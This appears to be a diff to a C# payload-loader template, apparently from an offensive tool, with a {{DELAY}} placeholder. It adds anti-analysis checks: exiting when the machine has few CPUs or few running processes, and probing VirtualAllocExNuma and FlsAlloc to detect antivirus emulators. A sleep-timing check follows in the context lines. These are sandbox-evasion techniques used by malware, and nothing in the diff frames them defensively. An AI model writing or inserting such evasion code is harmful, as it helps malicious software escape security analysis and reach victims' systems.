@@ -1,4 +1,21 @@
 
+            if (Environment.ProcessorCount < 2)
+            {
+                return;
+            }
+            if (Process.GetProcesses().Length < 50)
+            {
+                return;
+            }
+            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0)==IntPtr.Zero)
+            {
+                return;
+            }
+            if (FlsAlloc(IntPtr.Zero)==IntPtr.Zero)
+            {
+                return;
+            }
+            
 #if DELAY
             DateTime t1 = DateTime.Now;
             Sleep({{DELAY}} * 1000);
